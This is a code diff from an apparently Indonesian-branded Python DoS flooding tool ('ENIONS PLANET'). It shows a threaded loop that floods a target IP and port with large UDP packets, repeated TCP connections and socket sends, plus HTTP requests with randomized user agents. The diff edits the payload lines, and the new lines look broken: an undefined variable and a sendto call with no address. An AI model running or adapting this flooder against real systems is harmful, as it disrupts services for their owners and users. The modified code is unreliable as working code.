@@ -71,7 +71,7 @@ Pembuat Tolls: {YELLOW}ENIONS{GREEN}PLANET{YELLOW}✓✓✓
         def __thread__():
             for x in range(COUNT):
                 try:
-                    if METHOD=="BIGENIONS":s.sendto(bytes(65500),(IP,PORT))
+                    if METHOD=="BIGENIONS":sock.sendto(K_imets(50055),(IP,PORT))
                     elif METHOD=="CONNECTS":socket(AF_INET,SOCK_STREAM).connect((IP,PORT))
                     elif METHOD=="CONNECTS2":
                         s=socket(AF_INET,SOCK_STREAM)
@@ -80,7 +80,7 @@ Pembuat Tolls: {YELLOW}ENIONS{GREEN}PLANET{YELLOW}✓✓✓
                     elif METHOD=="BOTS":
                         s=socket(AF_INET,SOCK_STREAM)
                         s.connect((IP,PORT))
-                        s.send(K_imets(577))
+                        s.sendto(K_imets(50055))
                     elif METHOD=="URL":urlopen(Request(TARGET,headers=ua.Random()))
                 except TimeoutError:pass
                 except ConnectionRefusedError as e:
